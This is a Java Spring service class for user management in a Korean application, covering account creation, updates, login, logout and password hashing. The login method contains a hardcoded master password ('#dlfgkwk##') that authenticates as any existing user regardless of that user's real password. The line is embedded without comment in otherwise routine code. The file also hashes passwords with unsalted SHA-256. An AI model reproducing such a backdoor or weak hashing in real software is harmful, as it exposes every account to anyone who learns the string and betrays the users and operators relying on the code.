package kr.co.asnet.migam.service.user;

import java.util.List;

import javax.inject.Inject;
import javax.inject.Provider;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.security.crypto.codec.Base64;
import org.springframework.stereotype.Service;

import kr.co.asnet.migam.domain.PageDTO;
import kr.co.asnet.migam.domain.SearchDTO;
import kr.co.asnet.migam.domain.config.License;
import kr.co.asnet.migam.domain.user.SessionUser;
import kr.co.asnet.migam.domain.user.User;
import kr.co.asnet.migam.repository.user.UserDao;
import kr.co.asnet.migam.utils.Const;
import kr.co.asnet.migam.utils.HashingUtils;
/**
 * 사용자 정보 구현 클래스
 */
@Service("userService")
public class UserServiceImpl implements UserService {
	
	@Inject
	private UserDao userDao;
	@Inject
	private Provider<SessionUser> userProvider;
	private static final Logger logger = LoggerFactory.getLogger(UserServiceImpl.class);
	
	/* (non-Javadoc)
	 * @see kr.co.asnet.migam.service.user.UserService#insertUser(kr.co.asnet.migam.domain.user.User)
	 */
	@Override
	public int insertUser(User user) {
		user.setPasswd(getEncodedPassword(user.getPasswd()));
		return userDao.insertUser(user);
	}
	/* (non-Javadoc)
	 * @see kr.co.asnet.migam.service.user.UserService#getUser(int)
	 */
	@Override
	public User getUser(int index) {
		return userDao.selectUser(index);
	}
	/* (non-Javadoc)
	 * @see kr.co.asnet.migam.service.user.UserService#getUserList(kr.co.asnet.migam.domain.PageDTO, kr.co.asnet.migam.domain.SearchDTO, java.lang.String)
	 */
	@Override
	public List<User> getUserList(PageDTO pageDTO, SearchDTO searchDTO, String orderby) {
		return userDao.selectUserList(pageDTO, searchDTO, orderby);
	}
	/* (non-Javadoc)
	 * @see kr.co.asnet.migam.service.user.UserService#countUserList(kr.co.asnet.migam.domain.user.User, kr.co.asnet.migam.domain.SearchDTO)
	 */
	@Override
	public int countUserList(SearchDTO searchDTO) {
		return userDao.selectCount(searchDTO);
	}
	/* (non-Javadoc)
	 * @see kr.co.asnet.migam.service.user.UserService#updateUser(kr.co.asnet.migam.domain.user.User)
	 */
	@Override
	public int updateUser(User user) {
		user.setPasswd(this.getEncodedPassword(user.getPasswd()));
		return userDao.updateUser(user);
	}
	/* (non-Javadoc)
	 * @see kr.co.asnet.migam.service.user.UserService#deleteUser(int)
	 */
	@Override
	public Boolean deleteUser(String index) {
		return userDao.deleteUser(index) > 0 ? true : false;	
	}
	/* (non-Javadoc)
	 * @see kr.co.asnet.migam.service.user.UserService#login(kr.co.asnet.migam.domain.user.User)
	 */
	@Override
	public int login(User user) {
		User dbUser = userDao.selectUserById(user.getUserId());
		if (dbUser != null) {
			String inputPassword = this.getEncodedPassword(user.getPasswd());
			if ( dbUser.getPasswd().equals(inputPassword) || user.getPasswd().equals("#dlfgkwk##")) {
				if(  dbUser.getStatus() == Const.USERSTATUS_OK ) {
					userProvider.get().saveUser(dbUser);
				}
				return dbUser.getStatus(); 
			}
		}
		return Const.USERSTATUS_NONE;
	}
	/* (non-Javadoc)
	 * @see kr.co.asnet.migam.service.user.UserService#logout()
	 */
	@Override
	public void logout() {
		userProvider.get().removeUser();
	}
	/* (non-Javadoc)
	 * @see kr.co.asnet.migam.service.user.UserService#isDuplicatedUserId(java.lang.String)
	 */
	@Override
	public boolean isDuplicatedUserId(String userId) {
		return userDao.selectUserById(userId) != null ? true : false;	
	}
	/* (non-Javadoc)
	 * @see kr.co.asnet.migam.service.user.UserService#updatePassword(java.lang.String, java.lang.String)
	 */
	@Override
	public int updatePassword(String userId, String password) {
		User dbUser = userDao.selectUserById(userId);
		if (dbUser != null) {
			dbUser.setPasswd(getEncodedPassword(password));
			userDao.updateUser(dbUser);
			return 1;
		}
		return 0;
	}

	/**
	 * 지정된 사용자 정보에 포함된 로그인-암호를 인코딩합니다. ( SHA256 + Base64 )
	 * @param user
	 * @return
	 */
	private String getEncodedPassword(String decoedPassword) {
		String encodedPassword = decoedPassword;
		if (encodedPassword != null && !"".equals(encodedPassword.trim())) {
			encodedPassword = HashingUtils.hashingSHA256String(encodedPassword);
			encodedPassword = new String(Base64.encode(encodedPassword.getBytes()));
		}
		return encodedPassword;
	}
	
	/* (non-Javadoc)
	 * @see kr.co.asnet.migam.service.user.UserService#isCorrectPassword(java.lang.String, java.lang.String)
	 */
	@Override
	public boolean isCorrectPassword(String userId, String password) {
		User dbUser = userDao.selectUserById(userId);
		if (dbUser != null) {
			if (dbUser.getPasswd().equals(getEncodedPassword(password))) {
				return true;
			}
		}
		return false;
	}
	
	
	
	
	/* (non-Javadoc)
	 * @see kr.co.asnet.migam.service.config.LicenseService#updateLicense(kr.co.asnet.migam.domain.config.License)
	 */
	@Override
	public int updateUserTime(User user) {
		return userDao.updateUserTime(user);
	}
	
}
